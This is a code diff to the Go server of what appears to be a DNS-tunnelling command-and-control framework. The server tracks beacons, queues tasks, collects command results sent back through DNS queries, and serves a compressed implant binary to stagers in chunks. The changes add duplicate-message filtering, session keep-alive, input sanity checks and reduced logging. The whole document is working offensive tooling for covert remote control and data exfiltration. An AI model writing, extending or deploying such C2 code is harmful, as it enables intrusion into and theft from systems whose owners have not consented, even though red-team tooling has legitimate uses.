@@ -6,6 +6,7 @@ package main
 import (
 	"bytes"
 	"compress/gzip"
+	"crypto/sha256"
 	"encoding/base64"
 	"fmt"
 	"os"
@@ -31,9 +32,6 @@ const (
 
 	// Result preview settings
 	resultPreviewMaxLength = 200
-
-	// DNS label chunk size (RFC compliant)
-	//dnsLabelMaxLength = 62
 
 	// Session expiration times
 	stagerSessionTimeout  = 3 * time.Hour // Stager sessions expire after 3 hours (allows slow downloads)
@@ -85,12 +83,13 @@ type ExpectedResult struct {
 
 // StagerSession tracks a stager deployment session
 type StagerSession struct {
-	ClientIP    string
-	OS          string
-	Arch        string
-	Chunks      []string // Base64-encoded chunks
-	TotalChunks int
-	CreatedAt   time.Time
+	ClientIP     string
+	OS           string
+	Arch         string
+	Chunks       []string // Base64-encoded chunks
+	TotalChunks  int
+	CreatedAt    time.Time
+	LastActivity time.Time // Updated on each chunk request to prevent premature expiration
 }
 
 // C2Manager handles beacon management and tasking
@@ -100,6 +99,7 @@ type C2Manager struct {
 	resultChunks    map[string][]ResultChunk   // key: taskID (legacy)
 	expectedResults map[string]*ExpectedResult // key: taskID (new two-phase)
 	stagerSessions  map[string]*StagerSession  // key: clientIP
+	recentMessages  map[string]time.Time       // key: message hash, value: timestamp (deduplication)
 	mutex           sync.RWMutex
 	taskCounter     int
 	debug           bool
@@ -117,6 +117,7 @@ func NewC2Manager(debug bool, encryptionKey string) *C2Manager {
 		resultChunks:    make(map[string][]ResultChunk),
 		expectedResults: make(map[string]*ExpectedResult),
 		stagerSessions:  make(map[string]*StagerSession),
+		recentMessages:  make(map[string]time.Time),
 		taskCounter:     taskCounterStart,
 		debug:           debug,
 		aesKey:          aesKey,
@@ -139,10 +140,10 @@ func (c2 *C2Manager) cleanupExpiredSessions() {
 
 		// Clean up expired stager sessions
 		for ip, session := range c2.stagerSessions {
-			if now.Sub(session.CreatedAt) > stagerSessionTimeout {
+			if now.Sub(session.LastActivity) > stagerSessionTimeout {
 				delete(c2.stagerSessions, ip)
 				if c2.debug {
-					logf("[C2] Cleaned up expired stager session for %s", ip)
+					logf("[C2] Cleaned up expired stager session for %s (inactive for %v)", ip, now.Sub(session.LastActivity))
 				}
 			}
 		}
@@ -157,8 +158,32 @@ func (c2 *C2Manager) cleanupExpiredSessions() {
 			}
 		}
 
+		// Clean up recent message hashes older than 30 seconds (DNS retries complete)
+		for msgHash, timestamp := range c2.recentMessages {
+			if now.Sub(timestamp) > 30*time.Second {
+				delete(c2.recentMessages, msgHash)
+			}
+		}
+
 		c2.mutex.Unlock()
 	}
+}
+
+// GetEncryptionKey returns the AES encryption key for external use
+func (c2 *C2Manager) GetEncryptionKey() []byte {
+	return c2.aesKey
+}
+
+// isPrintableASCII checks if a string contains only printable ASCII characters
+// Used to validate that decrypted data is likely valid C2 traffic
+func isPrintableASCII(s string) bool {
+	for _, r := range s {
+		// Allow printable ASCII (space to ~) plus newlines/tabs
+		if r < 32 && r != 9 && r != 10 && r != 13 || r > 126 {
+			return false
+		}
+	}
+	return true
 }
 
 // decodeBeaconData decodes and decrypts beacon data using AES-GCM + base36
@@ -328,6 +353,15 @@ func (c2 *C2Manager) processBeaconQuery(qname string, clientIP string) (string, 
 	// Join all non-timestamp labels to reconstruct the base36 encoded message
 	encodedMessage := strings.Join(encodedLabels, "")
 
+	// Check if this looks like Base36-encoded data before trying to decode
+	// This prevents attempting to decrypt random DNS queries
+	if !looksLikeBase36(encodedMessage) {
+		if c2.debug {
+			logf("[DEBUG] Subdomain doesn't look like Base36 data, skipping: %s", subdomain)
+		}
+		return "", false
+	}
+
 	if c2.debug {
 		logf("[DEBUG] Processing subdomain: %s, extracted message: %s (removed timestamp: %v)",
 			subdomain, encodedMessage, len(encodedLabels) != len(labels))
@@ -379,6 +413,28 @@ func (c2 *C2Manager) processBeaconQuery(qname string, clientIP string) (string, 
 		return "", false
 	}
 
+	// Validate that decoded data contains printable characters (sanity check)
+	// If decryption produced garbage, don't log it
+	if !isPrintableASCII(decoded) {
+		if c2.debug {
+			logf("[DEBUG] Decoded data contains non-printable characters, likely not C2 traffic")
+		}
+		return "", false
+	}
+
+	// Check for duplicate messages (DNS retries) - hash the content
+	msgHash := fmt.Sprintf("%x", sha256.Sum256([]byte(decoded)))
+	isDuplicate := false
+	if lastSeen, exists := c2.recentMessages[msgHash]; exists {
+		isDuplicate = true
+		if c2.debug {
+			logf("[DEBUG] Duplicate message detected (seen %v ago)", time.Since(lastSeen))
+		}
+	} else {
+		// Mark new message as seen
+		c2.recentMessages[msgHash] = time.Now()
+	}
+
 	messageType := strings.SplitN(decoded, "|", 2)[0]
 	switch messageType {
 	case "STG": // Stager request
@@ -386,21 +442,21 @@ func (c2 *C2Manager) processBeaconQuery(qname string, clientIP string) (string, 
 		if len(parts) < 4 {
 			return "", false
 		}
-		return c2.handleStagerRequest(parts, clientIP), true
+		return c2.handleStagerRequest(parts, clientIP, isDuplicate), true
 
 	case "ACK": // Stager acknowledgment
 		parts := strings.SplitN(decoded, "|", 4) // ACK|chunk_index|IP|session
 		if len(parts) < 2 {
 			return "", false
 		}
-		return c2.handleStagerAck(parts, clientIP), true
+		return c2.handleStagerAck(parts, clientIP, isDuplicate), true
 
 	case "CHECKIN", "CHK":
 		parts := strings.SplitN(decoded, "|", 5) // CHK|id|host|user|os
 		if len(parts) < 5 {
 			return "", false
 		}
-		return c2.handleCheckin(parts, clientIP), true
+		return c2.handleCheckin(parts, clientIP, isDuplicate), true
 
 	case "RESULT":
 		// RESULT|beaconID|taskID|<entire result...>
@@ -408,14 +464,14 @@ func (c2 *C2Manager) processBeaconQuery(qname string, clientIP string) (string, 
 		if len(parts) < 4 {
 			return "", false
 		}
-		return c2.handleResult(parts), true
+		return c2.handleResult(parts, isDuplicate), true
 
 	case "RESULT_META":
 		parts := strings.SplitN(decoded, "|", 5) // RESULT_META|id|task|size|chunks
 		if len(parts) < 5 {
 			return "", false
 		}
-		return c2.handleResultMeta(parts), true
+		return c2.handleResultMeta(parts, isDuplicate), true
 
 	case "DATA":
 		// DATA|id|taskID|index|<chunk...>
@@ -423,7 +479,7 @@ func (c2 *C2Manager) processBeaconQuery(qname string, clientIP string) (string, 
 		if len(parts) < 5 {
 			return "", false
 		}
-		return c2.handleData(parts), true
+		return c2.handleData(parts, isDuplicate), true
 
 	case "CHUNK": // DEPRECATED: Legacy single-phase chunking, kept for backward compatibility
 		parts := strings.SplitN(decoded, "|", 6)
@@ -433,13 +489,16 @@ func (c2 *C2Manager) processBeaconQuery(qname string, clientIP string) (string, 
 		return c2.handleChunk(parts), true
 
 	default:
-		logf("[C2] Unknown message type: %s", messageType)
+		// Only log if debug mode (reduces noise from random DNS queries)
+		if c2.debug {
+			logf("[DEBUG] Unknown message type: %s", messageType)
+		}
 		return "", false
 	}
 }
 
 // handleCheckin processes a beacon check-in
-func (c2 *C2Manager) handleCheckin(parts []string, clientIP string) string {
+func (c2 *C2Manager) handleCheckin(parts []string, clientIP string, isDuplicate bool) string {
 	if len(parts) < 5 {
 		return "ERROR"
 	}
@@ -497,7 +556,7 @@ func (c2 *C2Manager) handleCheckin(parts []string, clientIP string) string {
 }
 
 // handleResult processes a command result from a beacon
-func (c2 *C2Manager) handleResult(parts []string) string {
+func (c2 *C2Manager) handleResult(parts []string, isDuplicate bool) string {
 	if len(parts) < 4 {
 		return "ERROR"
 	}
@@ -506,12 +565,14 @@ func (c2 *C2Manager) handleResult(parts []string) string {
 	taskID := parts[2]
 	result := parts[3]
 
-	// Log receipt of result (include small preview)
-	preview := result
-	if len(preview) > resultPreviewMaxLength {
-		preview = preview[:resultPreviewMaxLength] + "..."
+	// Log receipt of result (include small preview) - skip for duplicates
+	if !isDuplicate {
+		preview := result
+		if len(preview) > resultPreviewMaxLength {
+			preview = preview[:resultPreviewMaxLength] + "..."
+		}
+		logf("[C2] Result: %s → %s: %s", beaconID, taskID, preview)
 	}
-	logf("[C2] Result: %s → %s: %s", beaconID, taskID, preview)
 
 	// Update the task
 	if task, exists := c2.tasks[taskID]; exists {
@@ -580,7 +641,7 @@ func (c2 *C2Manager) reconstructResult(chunks []ResultChunk) string {
 }
 
 // handleResultMeta processes result metadata from beacon (two-phase protocol)
-func (c2 *C2Manager) handleResultMeta(parts []string) string {
+func (c2 *C2Manager) handleResultMeta(parts []string, isDuplicate bool) string {
 	if len(parts) < 5 {
 		return "ERROR"
 	}
@@ -590,8 +651,10 @@ func (c2 *C2Manager) handleResultMeta(parts []string) string {
 	totalSize, _ := strconv.Atoi(parts[3])
 	totalChunks, _ := strconv.Atoi(parts[4])
 
-	logf("[C2] Expecting chunked result from %s for %s: %d bytes in %d chunks",
-		beaconID, taskID, totalSize, totalChunks)
+	if !isDuplicate {
+		logf("[C2] Expecting chunked result from %s for %s: %d bytes in %d chunks",
+			beaconID, taskID, totalSize, totalChunks)
+	}
 
 	// Store the expectation
 	expected := &ExpectedResult{
@@ -608,7 +671,7 @@ func (c2 *C2Manager) handleResultMeta(parts []string) string {
 }
 
 // handleData processes data chunks from beacon (two-phase protocol)
-func (c2 *C2Manager) handleData(parts []string) string {
+func (c2 *C2Manager) handleData(parts []string, isDuplicate bool) string {
 	if len(parts) < 5 {
 		return "ERROR"
 	}
@@ -621,7 +684,18 @@ func (c2 *C2Manager) handleData(parts []string) string {
 	// Check if we're expecting this data
 	expected, exists := c2.expectedResults[taskID]
 	if !exists {
-		logf("[C2] Warning: Received DATA chunk for unknown task %s", taskID)
+		// Check if task already completed (duplicate chunk after completion)
+		if task, taskExists := c2.tasks[taskID]; taskExists && task.Status == "completed" {
+			// Task already completed, this is a duplicate chunk - silently ACK
+			if c2.debug {
+				logf("[DEBUG] Received duplicate DATA chunk for completed task %s", taskID)
+			}
+			return "ACK"
+		}
+		// Unknown task, log warning only if not a duplicate message
+		if !isDuplicate {
+			logf("[C2] Warning: Received DATA chunk for unknown task %s", taskID)
+		}
 		return "ERROR"
 	}
 
@@ -649,7 +723,10 @@ func (c2 *C2Manager) handleData(parts []string) string {
 		// Reconstruct the complete result
 		result := strings.Join(expected.ReceivedData, "")
 
-		logf("[C2] Result: %s → %s (%d bytes, %d chunks)", beaconID, taskID, len(result), expected.TotalChunks)
+		// Only log if not a duplicate
+		if !isDuplicate {
+			logf("[C2] Result: %s → %s (%d bytes, %d chunks)", beaconID, taskID, len(result), expected.TotalChunks)
+		}
 
 		// Update the task
 		if task, exists := c2.tasks[taskID]; exists {
@@ -666,7 +743,7 @@ func (c2 *C2Manager) handleData(parts []string) string {
 
 // handleStagerRequest processes a stager deployment request
 // Format: STG|IP|OS|ARCH
-func (c2 *C2Manager) handleStagerRequest(parts []string, clientIP string) string {
+func (c2 *C2Manager) handleStagerRequest(parts []string, clientIP string, isDuplicate bool) string {
 	if len(parts) < 4 {
 		return "ERROR"
 	}
@@ -675,7 +752,9 @@ func (c2 *C2Manager) handleStagerRequest(parts []string, clientIP string) string
 	stagerOS := parts[2]
 	stagerArch := parts[3]
 
-	logf("[C2] Stager request from %s (%s/%s) - IP: %s", clientIP, stagerOS, stagerArch, stagerIP)
+	if !isDuplicate {
+		logf("[C2] Stager request from %s (%s/%s) - IP: %s", clientIP, stagerOS, stagerArch, stagerIP)
+	}
 
 	// Determine client binary filename based on OS
 	var clientFilename string
@@ -704,41 +783,55 @@ func (c2 *C2Manager) handleStagerRequest(parts []string, clientIP string) string
 
 	// Check if we found a valid path
 	if clientPath == "" {
-		logf("[C2] Error: Client binary not found. Tried paths: %v", possiblePaths)
+		if !isDuplicate {
+			logf("[C2] Error: Client binary not found. Tried paths: %v", possiblePaths)
+		}
 		return "ERROR|BINARY_NOT_FOUND"
 	}
 
-	logf("[C2] Found client binary at: %s", clientPath)
+	if !isDuplicate {
+		logf("[C2] Found client binary at: %s", clientPath)
+	}
 
 	// Read client binary
 	clientData, err := os.ReadFile(clientPath)
 	if err != nil {
-		logf("[C2] Error reading client binary: %v", err)
+		if !isDuplicate {
+			logf("[C2] Error reading client binary: %v", err)
+		}
 		return "ERROR|READ_FAILED"
 	}
 
-	logf("[C2] Loaded client binary: %s (%d bytes)", clientPath, len(clientData))
+	if !isDuplicate {
+		logf("[C2] Loaded client binary: %s (%d bytes)", clientPath, len(clientData))
+	}
 
 	// Compress with gzip (use bytes.Buffer so we preserve raw binary data)
 	var compressedBuf bytes.Buffer
 	gzWriter := gzip.NewWriter(&compressedBuf)
 	_, err = gzWriter.Write(clientData)
 	if err != nil {
-		logf("[C2] Error compressing client: %v", err)
+		if !isDuplicate {
+			logf("[C2] Error compressing client: %v", err)
+		}
 		return "ERROR|COMPRESS_FAILED"
 	}
 	gzWriter.Close()
 
 	compressed := compressedBuf.Bytes()
-	logf("[C2] Compressed client: %d bytes -> %d bytes (%.1f%% reduction)",
-		len(clientData), len(compressed),
-		100.0*(1.0-float64(len(compressed))/float64(len(clientData))))
+	if !isDuplicate {
+		logf("[C2] Compressed client: %d bytes -> %d bytes (%.1f%% reduction)",
+			len(clientData), len(compressed),
+			100.0*(1.0-float64(len(compressed))/float64(len(clientData))))
+	}
 
 	// Base64 encode
 	base64Data := base64.StdEncoding.EncodeToString(compressed)
-	logf("[C2] Base64 encoded: %d bytes", len(base64Data))
+	if !isDuplicate {
+		logf("[C2] Base64 encoded: %d bytes", len(base64Data))
+	}
 
-	// Split into chunks (150 bytes - safe for UDP DNS with all overhead)
+	// Split into chunks (403 bytes - tested maximum for DNS infrastructure)
 	const chunkSize = 403
 	var chunks []string
 	for i := 0; i < len(base64Data); i += chunkSize {
@@ -749,17 +842,20 @@ func (c2 *C2Manager) handleStagerRequest(parts []string, clientIP string) string
 		chunks = append(chunks, base64Data[i:end])
 	}
 
-	logf("[C2] Split into %d chunks of %d bytes each", len(chunks), chunkSize)
+	if !isDuplicate {
+		logf("[C2] Split into %d chunks of %d bytes each", len(chunks), chunkSize)
+	}
 
 	// Store session for this stager using the stager's actual IP (not DNS resolver IP)
 	// This allows the stager to send ACKs through different DNS resolvers
 	session := &StagerSession{
-		ClientIP:    stagerIP, // Use stager's IP from the STG message
-		OS:          stagerOS,
-		Arch:        stagerArch,
-		Chunks:      chunks,
-		TotalChunks: len(chunks),
-		CreatedAt:   time.Now(),
+		ClientIP:     stagerIP, // Use stager's IP from the STG message
+		OS:           stagerOS,
+		Arch:         stagerArch,
+		Chunks:       chunks,
+		TotalChunks:  len(chunks),
+		CreatedAt:    time.Now(),
+		LastActivity: time.Now(), // Initialize activity timestamp
 	}
 	c2.stagerSessions[stagerIP] = session // Key by stager's actual IP
 
@@ -769,14 +865,16 @@ func (c2 *C2Manager) handleStagerRequest(parts []string, clientIP string) string
 
 // handleStagerAck processes a stager acknowledgment for chunk delivery
 // Format: ACK|chunk_index|stager_IP|hostname
-func (c2 *C2Manager) handleStagerAck(parts []string, clientIP string) string {
+func (c2 *C2Manager) handleStagerAck(parts []string, clientIP string, isDuplicate bool) string {
 	if len(parts) < 4 {
 		return "ERROR"
 	}
 
 	chunkIndex, err := strconv.Atoi(parts[1])
 	if err != nil {
-		logf("[C2] Invalid chunk index from %s: %s", clientIP, parts[1])
+		if !isDuplicate {
+			logf("[C2] Invalid chunk index from %s: %s", clientIP, parts[1])
+		}
 		return "ERROR|INVALID_INDEX"
 	}
 
@@ -785,22 +883,31 @@ func (c2 *C2Manager) handleStagerAck(parts []string, clientIP string) string {
 	// Look up the stager session using stager's actual IP (not DNS resolver IP)
 	session, exists := c2.stagerSessions[stagerIP]
 	if !exists {
-		logf("[C2] No stager session found for stager IP %s (DNS resolver: %s)", stagerIP, clientIP)
+		if !isDuplicate {
+			logf("[C2] No stager session found for stager IP %s (DNS resolver: %s)", stagerIP, clientIP)
+		}
 		return "ERROR|NO_SESSION"
 	}
 
+	// Update last activity timestamp to keep session alive during active downloads
+	session.LastActivity = time.Now()
+
 	// Validate chunk index
 	if chunkIndex < 0 || chunkIndex >= session.TotalChunks {
-		logf("[C2] Invalid chunk index %d (total: %d) from %s",
-			chunkIndex, session.TotalChunks, clientIP)
+		if !isDuplicate {
+			logf("[C2] Invalid chunk index %d (total: %d) from %s",
+				chunkIndex, session.TotalChunks, clientIP)
+		}
 		return "ERROR|INDEX_OUT_OF_RANGE"
 	}
 
 	// Get the requested chunk
 	chunk := session.Chunks[chunkIndex]
 
-	logf("[C2] Sending chunk %d/%d to %s (%d bytes)",
-		chunkIndex+1, session.TotalChunks, clientIP, len(chunk))
+	if !isDuplicate {
+		logf("[C2] Sending chunk %d/%d to %s (%d bytes)",
+			chunkIndex+1, session.TotalChunks, clientIP, len(chunk))
+	}
 
 	// Return chunk (CHUNK responses are NOT base36 encoded - sent as plain text)
 	// The stager expects: CHUNK|<base64_data>
